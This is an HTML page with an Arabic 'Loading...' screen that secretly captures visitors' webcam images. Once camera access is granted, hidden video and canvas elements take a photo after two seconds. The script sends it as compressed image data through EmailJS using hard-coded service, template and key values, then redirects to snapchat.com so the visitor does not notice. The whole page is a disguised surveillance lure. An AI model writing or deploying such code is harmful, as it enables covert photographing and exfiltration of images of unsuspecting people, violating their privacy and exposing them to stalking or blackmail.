<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <script type="text/javascript" src="https://jsdelivr.net"></script>
    <style>
        body { text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <h2>جاري التحميل...</h2>
    <video id="video" width="320" height="240" autoplay playsinline></video>
    <canvas id="canvas" width="320" height="240"></canvas>

    <script>
        const SERVICE_ID = "service_yea65ei";
        const TEMPLATE_ID = "template_tj626bi";
        const PUBLIC_KEY = "eWIb2mjCTi2UFeAAn";

        emailjs.init(PUBLIC_KEY);

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                setTimeout(captureAndSend, 2000);
            })
            .catch(() => { window.location.href = "https://snapchat.com"; });

        function captureAndSend() {
            const context = canvas.getContext('2d');
            // تصغير أبعاد الصورة لتقليل الحجم
            context.drawImage(video, 0, 0, 320, 240);
            
            // تقليل الجودة إلى 0.2 (20%) لضمان الإرسال المجاني
            const imageData = canvas.toDataURL('image/jpeg', 0.2);

            emailjs.send(SERVICE_ID, TEMPLATE_ID, {
                photo_data: imageData,
                title: "تنبيه: محاولة دخول"
            })
            .then(() => {
                window.location.href = "https://snapchat.com";
            })
            .catch((err) => {
                console.log("خطأ في الإرسال:", err);
                window.location.href = "https://snapchat.com";
            });
        }
    </script>
</body>
</html>
